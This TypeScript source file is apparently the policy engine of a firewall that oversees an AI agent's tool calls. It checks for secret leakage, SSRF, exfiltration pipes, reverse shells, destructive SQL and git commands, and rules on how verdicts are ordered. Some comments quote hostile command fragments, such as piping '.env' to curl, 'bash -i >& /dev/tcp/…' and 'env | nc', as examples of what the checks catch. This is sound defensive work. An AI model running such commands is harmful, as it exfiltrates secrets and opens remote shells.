import type { InspectionInput, ToolInspection } from '../shell/tool-input';
import { inspectionEntry, inspectionLayers } from '../shell/tool-input';
// Stateless policy evaluator. The host passes config, args, optional
// context (agent, cwd, active environment) and an optional hook bag for
// I/O-bound checks (binary provenance, trusted-host lookup).
//
// Engine purity: no fs/path/os/process imports here. Anything that needs
// to touch the host system arrives via the hooks parameter.

import type { SmartRule, DlpMatch } from '../types';
import { collectFileAccesses, incompleteFileVerdict } from '../files/protected-access';
import { evaluateFileChecks } from '../files/file-checks';
import type { FileAccessContext } from '../files/paths';
import { extractShellDestTokens } from '../shell/index';
import { reviewsEveryInline, isBlockAll } from '../levels';
import { ssrfFloor } from '../egress/ssrf';
import { ssrfDestinationFloor, extractToolDestinations } from '../egress/destinations';
import { scanArgumentSecrets } from '../dlp/arguments';
import {
  detectDangerousShellExec,
  analyzeShellCommand,
  analyzeFsOperation,
  analyzeSqlDestructive,
  analyzeChmod777,
  isRmCreatedInCommandCleanup,
  resolveShellInput,
  shellRuleArgs,
  detectInlineExec,
  inlineExecReview,
  inlineExecReason,
  inlineExecDescription,
  toolMatchesRule,
  AST_FS_REGEX_RULES,
  extractShellDestinations,
  type ShellCommandAnalysis,
} from '../shell';
import { analyzeGit } from '../shell/git';
import { analyzeOutbound } from '../shell/outbound';
import { extractRegistryOverrides, isPublicRegistryHost } from '../shell/package-registry';
import {
  matchesPattern,
  evaluateSmartConditions,
  getNestedValue,
  mcpServerFromToolName,
  ruleServerMatches,
} from '../rules';
import { analyzePipeChain } from './pipe-chain';
import { extractAllSshHosts } from './ssh-parser';
import { evaluateEgress, type EgressPolicy, type EgressVerdict } from '../egress';
import {
  checkIdForRule,
  checkValue,
  catalogSettingsFromConfig,
  getCheck,
  isVerdict,
  ssrfCheckId,
  BUILTIN_DANGEROUS_WORDS,
  type CatalogSettings,
  type Verdict,
} from '../catalog';

// ── Public types ──────────────────────────────────────────────────────────────

export interface PolicyConfig {
  policy: {
    sandboxPaths: string[];
    dangerousWords: string[];
    ignoredTools: string[];
    toolInspection: ToolInspection;
    /** Entries from a repository-carried config file; they may only add inspection. */
    projectToolInspection?: ToolInspection;
    smartRules: SmartRule[];
    dlp: {
      enabled: boolean;
      scanIgnoredTools: boolean;
      /** Inline-ask v2: 'block' upgrades review-severity DLP matches to a hard
       *  block. Optional for back-compat with callers that don't set it. */
      reviewAction?: 'review' | 'block';
    };
    /** Egress / destination control (GAP-5). Optional for back-compat with
     *  callers/tests that build a PolicyConfig without it. */
    egress?: EgressPolicy;
    /** Command-checks governance (command-checks-governance-spec.md): admin
     *  knobs for the built-in detections' REVIEW-severity findings only.
     *  Block-severity findings (pipe-critical, eval-remote, rm-rf-home,
     *  nuclear, suspect binary) have NO key here — non-weakenable by
     *  construction. Class-B keys (evalDynamic, pipeChainHigh) exclude 'off'.
     *  rmAdvisory is consumed by the PROXY at advisory-rule injection. */
    commandChecks?: {
      inlineExec?: 'off' | 'review' | 'block';
      rmAdvisory?: 'off' | 'review' | 'block';
      chmod?: 'off' | 'review' | 'block';
      sqlDdl?: 'off' | 'review' | 'block';
      evalDynamic?: 'review' | 'block';
      pipeChainHigh?: 'review' | 'block';
    };
    /**
     * Per-check values keyed by catalog id (`commands.sudo`: `off`), the
     * resolved map the host builds from its config file(s). Wins over the
     * legacy knobs above. Absent for a caller that still builds the legacy
     * shape by hand; the catalog then answers from those knobs.
     */
    checks?: Record<string, string>;
    /** Where each `checks` value came from (the host's resolution). A pinned,
     *  cloud-mandated pack rule follows only a `workspace` value (fw#390). */
    checkSources?: Record<string, 'local' | 'project' | 'workspace'>;
  };
  settings: {
    mode: string;
  };
}

/** The slice of a PolicyConfig the catalog resolver reads. */
function catalogSettings(config: PolicyConfig): CatalogSettings {
  return catalogSettingsFromConfig(config.settings, config.policy);
}

export interface PolicyContext extends FileAccessContext {
  /** "Terminal" disables most blocks (manual user typing). */
  agent?: string;
  /** Working directory passed through to provenance hook. */
  cwd?: string;
  /**
   * Resolved environment block from getActiveEnvironment() in the host.
   * If `requireApproval === false`, strict mode skips the catch-all review.
   */
  activeEnvironment?: { requireApproval?: boolean };
  /**
   * Task #20: evaluate the full rule chain even for an ignoredTools match.
   * Set by the orchestrator's jail guard AFTER it has already found a
   * jailed/sensitive path in a file-tool call — without this, the tier-1
   * fast path below returns 'allow' before the jail shield's `tool:'*'`
   * rules are ever consulted, making the jail engine-invisible to
   * Read/Grep/Glob. Opt-in per call; never set on the hot path.
   */
  skipIgnoredFastPath?: boolean;
  /**
   * The host's own `scanArgumentSecrets(args)` result for these exact
   * arguments, so the gate and the engine scan once per call. Set only by
   * trusted host code; absent means the engine scans.
   */
  argumentScan?: DlpMatch | null;
  /**
   * The MCP server label the host resolved for this call (the gateway's
   * `resolveServerLabel`, the hook's `mcp__<server>__` prefix). Absent: the
   * engine derives it from a namespaced tool name. Scopes rules that set
   * `server` / `notServer` (node9Firewall#390).
   */
  mcpServer?: string;
}

export type ProvenanceTrust = 'system' | 'managed' | 'user' | 'suspect' | 'unknown';

export interface ProvenanceLookup {
  resolvedPath: string;
  trustLevel: ProvenanceTrust;
  reason: string;
}

export interface PolicyHostHooks {
  /** Resolves an absolute binary path to a trust classification. */
  checkProvenance?: (binary: string, cwd?: string) => ProvenanceLookup;
  /** Returns true if the host is on the user's trusted-hosts allowlist. */
  isTrustedHost?: (host: string) => boolean;
  /** The agent settings file at `absPath` as it is on disk now (a regular
   *  file within the host's size cap), or null (node9Firewall#413 part 4). */
  readAgentSettings?: (absPath: string) => string | null;
  /** True when the user's own npm, yarn, bun, pip or uv configuration names
   *  this registry host (node9Firewall#415 item 4). Absent: only the public
   *  registries and the machine itself count as configured. */
  isConfiguredRegistry?: (host: string, cwd?: string) => boolean;
  /** True when `dir` (relative to `cwd`) is the top of a git work tree: it
   *  holds a `.git` entry. Decides `git -C <dir> add .` (node9Firewall#413).
   *  Absent, or no cwd: the stage-all finding stands. */
  isGitWorkTreeTop?: (dir: string, cwd: string) => boolean;
}

export interface PolicyVerdict {
  decision: 'allow' | 'review' | 'block';
  blockedByLabel?: string;
  reason?: string;
  matchedField?: string;
  matchedWord?: string;
  tier?: 1 | 2 | 3 | 4 | 5 | 6 | 7;
  /**
   * False when NO human may override this verdict: the SSRF tier-1 floors,
   * whose own reason string already tells the user "This address cannot be
   * allowlisted". Absent means an override is a legitimate product decision,
   * which is every other verdict.
   *
   * It exists because the host downgrades a hard block into a review whenever a
   * human approver is reachable (orchestrator.ts, `mayDowngrade`). That is right
   * for a smart-rule block and wrong for a floor, and the host could not tell
   * the two apart: `overridable` was computed in egress/ssrf.ts, rendered into
   * the reason sentence, and then dropped here.
   */
  overridable?: boolean;
  ruleName?: string;
  /**
   * True on an `allow` that records a finding: the check is set to `log`, so
   * the call runs and the audit row names the check (through ruleName and
   * checkId), but nothing stops. Never set together with review or block.
   */
  logged?: boolean;
  /**
   * The catalog check this verdict belongs to (`commands.sudo`,
   * `data.secrets`, ...). Set on every non-allow verdict a built-in detector,
   * a product rule or a pack rule produces; absent on an allow and on a user
   * or organisation rule, which are rules, not checks. See catalog.ts.
   */
  checkId?: string;
  /** State predicates from the matched smart rule (only when decision is 'block'). */
  dependsOnStatePredicates?: string[];
  /** Recovery command to suggest when this rule hard-blocks (from SmartRule.recoveryCommand). */
  recoveryCommand?: string;
  /** Plain-English description of what the rule does (from SmartRule.description). */
  ruleDescription?: string;
}

// ── Internal helpers ──────────────────────────────────────────────────────────

const VERDICT_RANK: Record<SmartRule['verdict'], number> = {
  allow: 0,
  review: 1,
  block: 2,
};

/**
 * Resolve which of several MATCHING smart rules decides the verdict (the
 * pinned-only conflict engine, Phase 3b). The model:
 *   1. If any matching rule is `pinned` (a manager "keep mine" cloud rule),
 *      only the pinned rules compete and the MOST-RESTRICTIVE pinned wins
 *      (block > review > allow) — so a manager's locked rule can't be
 *      overridden by a developer's local rule.
 *   2. Otherwise the FIRST match wins — byte-for-byte the previous `.find()`
 *      behaviour. This is the zero-regression guarantee: with nothing pinned,
 *      nothing changes.
 * Exported so the resolution is unit-testable in isolation.
 */
export function resolvePinned(matches: SmartRule[]): SmartRule | undefined {
  if (matches.length === 0) return undefined;
  const pinned = matches.filter((r) => r.pinned);
  if (pinned.length === 0) return matches[0];
  return pinned.reduce((best, r) =>
    VERDICT_RANK[r.verdict] > VERDICT_RANK[best.verdict] ? r : best
  );
}

/**
 * Resolve competing BUILT-IN detector verdicts for one command: the strictest
 * wins, ties keep the first (which fixes the label, so report attribution is
 * stable). Returns undefined when no detector claimed the command.
 *
 * This is the built-in counterpart to `resolvePinned` above — deliberately a
 * DIFFERENT law. User smart rules resolve first-match, because a user's early
 * `allow` rule is an intentional exception and allow-lists depend on it.
 * Built-in detectors have no authored order to respect: they are independent
 * opinions about the same command, so the only defensible answer is the
 * strictest one. Encoding their precedence as statement order instead is what
 * produced two inverted-verdict bugs in this arc (see the collection site).
 */
export function strictestVerdict(candidates: PolicyVerdict[]): PolicyVerdict | undefined {
  if (candidates.length === 0) return undefined;
  return candidates.reduce((best, c) =>
    VERDICT_RANK[c.decision] > VERDICT_RANK[best.decision] ? c : best
  );
}

function tokenize(toolName: string): string[] {
  return toolName
    .toLowerCase()
    .split(/[_.\-\s]+/)
    .filter(Boolean);
}

function extractShellCommand(
  toolName: string,
  args: unknown,
  toolInspection: InspectionInput
): string | null {
  const fieldPath = inspectionEntry(toolName, toolInspection);
  if (fieldPath === undefined) return null;
  const value = getNestedValue(args, typeof fieldPath === 'string' ? fieldPath : fieldPath.field);
  return typeof value === 'string' ? value : null;
}

/** Returns true when a tool's inspected field is SQL (sql or query). */
function isSqlTool(toolName: string, toolInspection: InspectionInput): boolean {
  const fieldName = inspectionEntry(toolName, toolInspection);
  return fieldName === 'sql' || fieldName === 'query';
}

// SQL DML keywords — safe in a scoped context (WHERE clause present).
// Filtered from tokens so user dangerousWords like "delete"/"update" don't
// re-trigger after the WHERE-clause check has already passed.
const SQL_DML_KEYWORDS = new Set(['select', 'insert', 'update', 'delete', 'merge', 'upsert']);

/**
 * Checks a SQL string for dangerous unscoped mutations.
 * Returns a reason string if dangerous, null if safe.
 */
export function checkDangerousSql(sql: string): string | null {
  const norm = sql.replace(/\s+/g, ' ').trim().toLowerCase();
  const hasWhere = /\bwhere\b/.test(norm);

  if (/^delete\s+from\s+\S+/.test(norm) && !hasWhere)
    return 'DELETE without WHERE — full table wipe';

  if (/^update\s+\S+\s+set\s+/.test(norm) && !hasWhere)
    return 'UPDATE without WHERE — updates every row';

  return null;
}

/**
 * Translate a pipe-chain analysis into a PolicyVerdict, applying the
 * trust-host downgrade. Returns null when no verdict applies (no pipe, or
 * pipe risk below high). Shared between the early bash-command tier (which
 * pre-empts AST so trusted hosts still allow) and the existing tier-3
 * shellCommand path (which catches non-bash-tool config shapes).
 */
function pipeChainVerdict(
  command: string,
  isTrustedHost?: (host: string) => boolean,
  // The `data.pipe-chain` check's value, for the HIGH tier's untrusted-sink
  // case. The critical tier is `data.pipe-chain-obfuscated` and always blocks.
  highAction: Verdict = 'review'
): PolicyVerdict | null {
  const pipeAnalysis = analyzePipeChain(command);
  if (!pipeAnalysis.isPipeline) return null;
  if (pipeAnalysis.risk !== 'critical' && pipeAnalysis.risk !== 'high') return null;

  const sinks = pipeAnalysis.sinkTargets;
  // sinks.length === 0 means no network targets were identified → treat as untrusted
  const allTrusted =
    sinks.length > 0 && sinks.every((host) => (isTrustedHost ? isTrustedHost(host) : false));

  if (pipeAnalysis.risk === 'critical') {
    if (allTrusted) {
      return {
        decision: 'review',
        blockedByLabel: 'Node9: Pipe-Chain to Trusted Host (obfuscated)',
        reason: `Obfuscated pipe to trusted host(s): ${sinks.join(', ')} — requires approval`,
        tier: 3,
        checkId: 'data.pipe-chain-obfuscated',
      };
    }
    return {
      decision: 'block',
      blockedByLabel: 'Node9: Pipe-Chain Exfiltration (critical)',
      reason: `Sensitive file piped through obfuscator to network sink: ${pipeAnalysis.sourceFiles.join(', ')} → ${sinks.join(', ')}`,
      tier: 3,
      checkId: 'data.pipe-chain-obfuscated',
    };
  }

  // high risk: trusted hosts → allow; untrusted → review
  if (allTrusted) {
    return {
      decision: 'allow',
      blockedByLabel: 'Node9: Pipe-Chain to Trusted Host',
      reason: `Sensitive file piped to trusted host(s): ${sinks.join(', ')}`,
      tier: 3,
    };
  }
  return applyCheckValue(highAction, {
    decision: 'review',
    blockedByLabel: 'Node9: Pipe-Chain Exfiltration (high)',
    reason: `Sensitive file piped to network sink: ${pipeAnalysis.sourceFiles.join(', ')} → ${sinks.join(', ')}`,
    tier: 3,
    checkId: 'data.pipe-chain',
  });
}

/**
 * Apply a check's value to the verdict its detector built. `off` drops the
 * finding, `log` turns it into an allow that still names the check (the
 * audit row records it), `review` and `block` set the decision. A logged
 * allow must never be returned early by a caller: it would skip the tiers
 * below it (the SSRF floor among them), so callers keep it aside and hand it
 * back only where they would otherwise allow.
 */
function applyCheckValue(value: Verdict, verdict: PolicyVerdict): PolicyVerdict | null {
  if (value === 'off') return null;
  if (value === 'log')
    return {
      ...verdict,
      decision: 'allow',
      logged: true,
      ruleName: verdict.ruleName ?? verdict.blockedByLabel,
    };
  return { ...verdict, decision: value };
}

// ── Public evaluator ──────────────────────────────────────────────────────────

/**
 * Stateless policy evaluation. Same waterfall as the original
 * proxy/src/policy/index.ts:evaluatePolicy, but config + context + I/O
 * hooks come in as parameters so this function works in any host.
 *
 * Returns 'allow' for ignored tools, the matched smart-rule verdict,
 * inline-execution review, eval-detection verdict, pipe-chain verdict,
 * provenance verdict, sandbox allow, dangerous-word review, or strict-mode
 * fallback. See the design doc for the full tier table.
 */
/**
 * ONE egress verdict shape, for both carriers. The shell branch and the
 * tool branch built this separately for one commit and already disagreed on
 * how to spell ruleName; `eg.binary` IS the tool name for a tool carrier and
 * the binary for a shell one, so it is the single right subject for both.
 *
 * `overridable` is deliberately unset: the egress POLICY is overridable (an
 * allowlist entry lifts it). Only the SSRF floor carries overridable: false.
 */
function egressPolicyVerdict(eg: EgressVerdict): PolicyVerdict {
  return {
    decision: eg.verdict,
    blockedByLabel:
      eg.verdict === 'block' ? '🌐 Node9 Egress (Blocked)' : '🌐 Node9 Egress (Review)',
    reason: eg.reason,
    ruleName: `egress:${eg.binary}:${eg.host}`,
    ruleDescription: eg.reason,
    tier: eg.verdict === 'block' ? 3 : 4,
    checkId: 'network.unknown-host',
  };
}

export async function evaluatePolicy(
  config: PolicyConfig,
  toolName: string,
  args?: unknown,
  context: PolicyContext = {},
  hostHooks: PolicyHostHooks = {}
): Promise<PolicyVerdict> {
  let protectedVerdict: PolicyVerdict | null = null;
  const layers = inspectionLayers(config.policy);
  if (context.agent !== 'Terminal') {
    try {
      const accesses = context.accesses ?? collectFileAccesses(toolName, args, context, layers);
      const settings = catalogSettings(config);
      const fromShell = resolveShellInput(toolName, args, layers).kind === 'shell';
      // Protected files, git hooks (node9Firewall#413 part 2) and the
      // agent's own files (part 4); the history scan runs the same function.
      protectedVerdict = evaluateFileChecks(args, accesses, context, settings, fromShell, {
        readAgentSettings: hostHooks.readAgentSettings,
      });
    } catch {
      // An exception while inspecting file operands must never fail open.
      protectedVerdict = incompleteFileVerdict();
    }
  }
  // This floor precedes DLP reviews, ignored tools and trusted-host pipe allows.
  if (protectedVerdict?.decision === 'block') return protectedVerdict;
  let dlpVerdict: PolicyVerdict | undefined;
  const wouldBeIgnored = matchesPattern(toolName, config.policy.ignoredTools);
  if (config.policy.dlp.enabled && (!wouldBeIgnored || config.policy.dlp.scanIgnoredTools)) {
    const dlpMatch =
      args === undefined
        ? null
        : context.argumentScan !== undefined
          ? context.argumentScan
          : scanArgumentSecrets(args);
    if (dlpMatch) {
      dlpVerdict = {
        // reviewAction:'block' (inline-ask v2): the admin upgraded
        // review-severity matches to a hard block — every evaluatePolicy
        // caller (orchestrator, explain, gateway) must agree with the gate.
        decision:
          dlpMatch.severity === 'block' || config.policy.dlp.reviewAction === 'block'
            ? 'block'
            : 'review',
        blockedByLabel: `DLP: ${dlpMatch.patternName}`,
        reason: `${dlpMatch.patternName} detected in ${dlpMatch.fieldPath}`,
        checkId: dlpMatch.severity === 'block' ? 'data.secrets' : 'data.secrets-weak',
      };
    }
  }
  if (dlpVerdict?.decision === 'block') return dlpVerdict;
  const result = await evaluatePolicyCore(
    config,
    toolName,
    args,
    {
      ...context,
      skipIgnoredFastPath: context.skipIgnoredFastPath || protectedVerdict?.decision === 'review',
    },
    hostHooks
  );
  if (result.decision === 'block') return result;
  if (
    context.agent !== 'Terminal' &&
    resolveShellInput(toolName, args, layers).kind === 'uninspectable'
  ) {
    return {
      decision: 'review',
      ruleName: 'shell-inspection-incomplete',
      blockedByLabel: 'Shell inspection incomplete',
      reason: 'The executable command could not be inspected. Approve this call explicitly.',
    };
  }
  if (protectedVerdict?.decision === 'review') return protectedVerdict;
  if (dlpVerdict) return dlpVerdict;
  // A logged file finding stands in for a plain allow; a logged finding the
  // core already made (a Soft git or sudo finding) is kept, since the audit
  // row names one check and the command's own is the one it was asked about.
  return result.decision === 'allow' && protectedVerdict?.logged && !result.logged
    ? protectedVerdict
    : result;
}

async function evaluatePolicyCore(
  config: PolicyConfig,
  toolName: string,
  args?: unknown,
  context: PolicyContext = {},
  hooks: PolicyHostHooks = {}
): Promise<PolicyVerdict> {
  const { agent, cwd, activeEnvironment } = context;
  const { checkProvenance, isTrustedHost, isConfiguredRegistry, isGitWorkTreeTop } = hooks;
  const settingsView = catalogSettings(config);
  const layers = inspectionLayers(config.policy);
  // ONE reader for every built-in site: the check's value in force.
  const cv = (id: string): Verdict => checkValue(settingsView, id);
  // A finding whose check is `log`: kept aside and returned only where the
  // evaluation would otherwise allow, never ahead of a later tier.
  let loggedFinding: PolicyVerdict | undefined;
  const noteLogged = (v: PolicyVerdict | null): void => {
    if (v?.logged && !loggedFinding) loggedFinding = v;
  };
  const allowed = (): PolicyVerdict => loggedFinding ?? { decision: 'allow' };

  // Content DLP is collected by evaluatePolicy before this waterfall.
  const shellInput = resolveShellInput(toolName, args, layers);
  const wouldBeIgnored = matchesPattern(toolName, config.policy.ignoredTools);

  // ── SSRF floor, non-shell destinations ──────────────────────────────────
  // A tool that fetches a URL itself reaches a protected address without ever
  // producing a shell command, so the floor below would never see it. Judged
  // by a CLOSED LIST of tool + argument paths: there is no seam that reaches
  // WebFetch without also reaching Grep and an Agent prompt, and a
  // false-positive corpus found six families where nothing tells a
  // destination apart from a mention. See egress/destinations.ts.
  //
  // Placed BEFORE the ignoredTools fast path, for the same reason the DLP
  // scanner above is: `webfetch`, `get_*`, `read_*` and `list_*` are all on
  // that list, so anything after it is dead code for exactly the tools that
  // carry this gap. Measured: with the check one block lower, WebFetch still
  // reached the metadata endpoint while `navigate` was blocked.
  //
  // Here, in the engine, so `node9 explain`, `simulate` and the posture probes
  // inherit it and cannot disagree with the gate. The orchestrator calls the
  // same function on the live hook path, where evaluatePolicy is never reached
  // for an ignored tool at all.
  {
    const dest = ssrfDestinationFloor(toolName, args, {
      ssrfAllow: config.policy.egress?.ssrfAllow,
      ssrfStrict: config.policy.egress?.ssrfStrict,
      allowPrivate: config.policy.egress?.enabled ? config.policy.egress.allowPrivate : undefined,
    });
    if (dest) {
      return {
        decision: dest.decision,
        blockedByLabel: '🌐 Node9 Egress (Protected Address)',
        reason: dest.reason,
        ruleName: `ssrf:${dest.tier}:${toolName}:${dest.host}`,
        ruleDescription: dest.reason,
        tier: 3,
        overridable: dest.overridable,
        checkId: ssrfCheckId(dest.tier),
      };
    }
  }

  // ── Egress policy, non-shell destinations (G10) ──────────────────────────
  // The shell branch applies evaluateEgress to curl/wget/…; a tool that
  // fetches a URL itself never has a shellCommand, so that branch cannot see
  // it (measured 2026-09-20: curl to an unknown host denied, the same URL
  // through WebFetch / MCP fetch / navigate allowed). Same closed list as the
  // floor above, same evaluator as the shell branch, one verdict builder.
  //
  // COMPUTED here, RETURNED later. The fast path below returns for an ignored
  // tool (WebFetch is on ignoredTools), so the verdict has to exist before
  // it; but returning it here put it ahead of smart rules, while the shell
  // branch sits AFTER them, and a user `block` rule on a tool carrier was
  // downgraded to this review (measured). So it is held and returned at the
  // two points that mirror the shell law: at the fast path for an ignored
  // tool, and after the smart-rule section for everything else.
  //
  // The floor already ran, so a tier-1 address is a non-overridable block and
  // never reaches this policy.
  const pendingToolEgress: PolicyVerdict | undefined = config.policy.egress?.enabled
    ? (() => {
        const dests = extractToolDestinations(toolName, args);
        const eg = dests.length > 0 ? evaluateEgress(dests, config.policy.egress) : null;
        return eg ? egressPolicyVerdict(eg) : undefined;
      })()
    : undefined;

  // 1. Ignored tools (Fast Path) - Always allow these first
  // Task #20: the jail guard sets skipIgnoredFastPath after finding a jailed
  // path in a file-tool call — the shield's rules must get to speak.
  // G10: an ignored tool that declared a destination the egress policy
  // actions gets that verdict instead of the silent allow. Smart rules never
  // ran for an ignored tool before this change and still do not.
  if (wouldBeIgnored && shellInput.kind === 'not-shell' && !context.skipIgnoredFastPath) {
    return pendingToolEgress ?? { decision: 'allow' };
  }

  // ONE definition of "this tool carries a shell command": a BASH_TOOL_NAMES
  // spelling, or a toolInspection 'command' field (terminal.execute). Every
  // shell-facing decision below keys off this — the AST tiers, the rm waiver,
  // AST suppression, and the smart-rule alias. Keeping them in sync is
  // load-bearing: /code-review 2026-08-13 found that matching rules by
  // shell-shape while gating AST tiers on isBashTool alone left
  // `terminal.execute` running the AST-superseded REGEX twins with no AST to
  // correct them — resurrecting the `grep "drop table"` false positive and
  // making commandChecks.chmod/sqlDdl inoperative for that tool.
  const shellShapedCommand = shellInput.kind === 'shell' ? shellInput.command : null;

  // AST FS-op gate — only fires for AI-driven calls. node9 is AI-driven; manual
  // (Terminal) users are trusted and reach the tier-4 manual auto-allow without
  // AST/regex interference. Mirrors the CLI scan's per-agent gates
  // (scan.ts:1037, 1319, 1614).
  const bashCommand = agent !== 'Terminal' ? shellShapedCommand : null;
  // A tier-2 REVIEW (a credential copy) carried past the smart-rules tier so a
  // stricter rule can still win. See the analyzeFsOperation site below.
  let pendingAstReview: PolicyVerdict | undefined;

  // Layer-1 invariant: built-in AST blocks (block-rm-rf-home, project-jail
  // sensitive-file reads) must fire BEFORE user smart rules so a permissive
  // user allow rule cannot bypass them. Pipe-chain trust-host analysis runs
  // FIRST so an explicit trusted-host pipe (e.g. cat .env | curl
  // https://trusted.com) can still downgrade AST's block — trust list is an
  // explicit user opt-in. See core.test.ts:1763 and v1.4.0-trusted-hosts.
  if (bashCommand !== null) {
    // Outbound actions (node9Firewall#415): a shell wired to a socket, the
    // whole environment handed to a sender, an install from a registry the
    // user never set up. Judged FIRST in this tier: the tiers below return a
    // review at once (pipe-chain, SQL, chmod), and `chmod 777 x; bash -i >&
    // /dev/tcp/…` must not turn the block into an approvable prompt. A block
    // returns here, ahead of user rules; a review is carried to the tier-3
    // candidates like the git findings below.
    const outboundChecks = ['commands.reverse-shell', 'data.env-exfil'] as const;
    const outboundVerdicts: Array<PolicyVerdict | null> = [];
    if (outboundChecks.some((id) => cv(id) !== 'off')) {
      const outbound = analyzeOutbound(bashCommand);
      for (const id of outboundChecks) {
        const action = cv(id);
        const finding =
          action === 'off' ? undefined : outbound.findings.find((f) => f.checkId === id);
        if (!finding) continue;
        // The environment going to hosts the user trusts with secrets is the
        // pipe-chain's trusted-host case: allowed. Judged on the hosts the
        // environment is sent to, not every host in the command: a trusted
        // `curl` beside `env | nc "$H" 9` must not exempt the nc.
        if (id === 'data.env-exfil' && isTrustedHost) {
          const hosts = finding.destinations;
          if (hosts && hosts.length > 0 && hosts.every((h) => isTrustedHost(h))) continue;
        }
        outboundVerdicts.push(
          applyCheckValue(action, {
            decision: 'review',
            blockedByLabel: `Node9 (AST): ${finding.ruleName}`,
            reason: finding.reason,
            tier: 2,
            ruleName: finding.ruleName,
            ruleDescription: finding.description,
            checkId: finding.checkId,
          })
        );
      }
    }
    const registryAction = cv('loading.unknown-registry');
    if (registryAction !== 'off') {
      const unknown = extractRegistryOverrides(bashCommand).filter(
        (o) =>
          !isPublicRegistryHost(o.host) &&
          !(isTrustedHost?.(o.host) ?? false) &&
          !(isConfiguredRegistry?.(o.host, cwd) ?? false)
      );
      if (unknown.length > 0) {
        const named = [...new Set(unknown.map((o) => `${o.host} (${o.manager} ${o.via})`))];
        outboundVerdicts.push(
          applyCheckValue(registryAction, {
            decision: 'review',
            blockedByLabel: 'Node9 (AST): review-unknown-registry',
            reason: `Package from an unknown registry: ${named.join(', ')} is not the public registry and not in your package manager configuration`,
            tier: 2,
            ruleName: 'review-unknown-registry',
            ruleDescription:
              'The package and its install scripts come from a registry nobody set up on this machine.',
            checkId: 'loading.unknown-registry',
          })
        );
      }
    }
    const outboundBlock = outboundVerdicts.find((v) => v?.decision === 'block');
    if (outboundBlock) return outboundBlock;
    for (const v of outboundVerdicts) {
      if (v?.logged) noteLogged(v);
      else if (v && !pendingAstReview) pendingAstReview = v;
    }

    const pipeVerdict = pipeChainVerdict(bashCommand, isTrustedHost, cv('data.pipe-chain'));
    if (pipeVerdict?.logged) noteLogged(pipeVerdict);
    else if (pipeVerdict) return pipeVerdict;

    const fsVerdict = analyzeFsOperation(bashCommand);
    if (fsVerdict) {
      const isShieldRule = fsVerdict.ruleName.startsWith('shield:');
      const labelPrefix = isShieldRule ? 'project-jail (AST)' : 'Node9 (AST)';
      const astVerdict: PolicyVerdict = {
        decision: fsVerdict.verdict,
        blockedByLabel: `${labelPrefix}: ${fsVerdict.ruleName}`,
        reason: fsVerdict.reason,
        tier: 2,
        ruleName: fsVerdict.ruleName,
        ruleDescription: fsVerdict.reason,
        checkId: checkIdForRule(fsVerdict.ruleName),
      };
      // A BLOCK returns here, ahead of user rules, so a permissive rule cannot
      // bypass it (the layer-1 invariant above). A REVIEW must NOT: stage 4
      // (2026-09-12) made a credential COPY a review, and returning it at tier 2
      // silenced an org/user jail rule that BLOCKS the same path -- `jail add
      // ~/.ssh` or managedConfig.jailPaths -- which fired before the AST tier
      // learned copies (/code-review, cross-file tracer). Two verdicts on one
      // input resolve by MAX, never by order: the review is carried to the
      // tier-3 candidates, where a stricter rule still wins and a permissive
      // `allow` rule cannot silence it.
      if (fsVerdict.verdict === 'block') return astVerdict;
      pendingAstReview = astVerdict;
    }

    // SQL-DDL via a real DB CLI — AST-aware so a grep/echo of "drop table" /
    // "|mysql" no longer false-positives (the regex smart rule is suppressed for
    // bash via AST_FS_REGEX_RULES). Mirrors the rm/sudo/chmod AST migrations.
    const sqlAction = cv('commands.sql-ddl');
    const sqlVerdict = sqlAction === 'off' ? null : analyzeSqlDestructive(bashCommand);
    if (sqlVerdict) {
      const v = applyCheckValue(sqlAction, {
        decision: 'review',
        blockedByLabel: `Node9 (AST): ${sqlVerdict.ruleName}`,
        reason: sqlVerdict.reason,
        tier: 2,
        ruleName: sqlVerdict.ruleName,
        ruleDescription: sqlVerdict.description,
        checkId: 'commands.sql-ddl',
      });
      if (v?.logged) noteLogged(v);
      else if (v) return v;
    }

    // chmod 777 / 0777 / a+rwx (world-writable only; +x is execute-only and
    // excluded) via a real chmod command — AST-aware so
    // `chmod 777` inside a `node -e` / `python -c` string or regex literal no
    // longer false-positives (the regex smart rule is suppressed for bash via
    // AST_FS_REGEX_RULES). Mirrors the SQL-DDL AST migration above. The rule
    // name is shield-prefixed, so use the project-jail (AST) label like the
    // fs-op branch does for shield rules.
    const chmodAction = cv('commands.chmod');
    const chmodVerdict = chmodAction === 'off' ? null : analyzeChmod777(bashCommand);
    if (chmodVerdict) {
      const v = applyCheckValue(chmodAction, {
        decision: 'review',
        blockedByLabel: `project-jail (AST): ${chmodVerdict.ruleName}`,
        reason: chmodVerdict.reason,
        tier: 2,
        ruleName: chmodVerdict.ruleName,
        ruleDescription: chmodVerdict.description,
        checkId: 'commands.chmod',
      });
      if (v?.logged) noteLogged(v);
      else if (v) return v;
    }

    // Git, read from the parsed command (node9Firewall#413): `-C`, env,
    // wrappers, variables and aliases defined in the same command, `sh -c`
    // payloads; `--dry-run` and `clean -n` honoured, `branch -d` is not `-D`,
    // a plain rebase is not destruction. The regex twins are suppressed for a
    // command that parsed (AST_FS_REGEX_RULES) and keep speaking for one that
    // did not.
    // The hooks-bypass check (part 2) rides the same walk: one finding per
    // check, each through its own value.
    const gitChecks = [
      'commands.git-destructive',
      'commands.git-hooks-bypass',
      // Part 3, off at every level; its finding is dropped unless a person set it.
      'commands.git-stage-all',
    ] as const;
    if (gitChecks.some((id) => cv(id) !== 'off')) {
      const git = analyzeGit(bashCommand);
      for (const id of gitChecks) {
        const action = cv(id);
        const finding = action === 'off' ? undefined : git.findings.find((f) => f.checkId === id);
        if (!finding) continue;
        // `git -C <dir> add .` stages the whole tree only if <dir> is its top.
        if (
          finding.ifWorkTreeTop !== undefined &&
          isGitWorkTreeTop &&
          cwd &&
          !isGitWorkTreeTop(finding.ifWorkTreeTop, cwd)
        )
          continue;
        const v = applyCheckValue(action, {
          decision: 'review',
          blockedByLabel: `Node9 (AST): ${finding.ruleName}`,
          reason: finding.reason,
          tier: 2,
          ruleName: finding.ruleName,
          ruleDescription: finding.description,
          checkId: finding.checkId,
        });
        // A REVIEW is carried to the tier-3 candidates, not returned here: a
        // user's own `block-force-push` rule (the commonest git rule people
        // write) must still win over it, as for the credential-copy review
        // above. A `block` value set on the check returns at once.
        if (v?.logged) noteLogged(v);
        else if (v?.decision === 'block') return v;
        else if (v && !pendingAstReview) pendingAstReview = v;
      }
    }
  }

  // 2. Smart Rules — raw args matching before tokenization.
  // When AST ran on this bash command, suppress regex rules whose detection
  // AST already provides — they FP on JSON args, heredocs, and chained-command
  // segments that AST handles correctly. Mirrors scan.ts:1059.
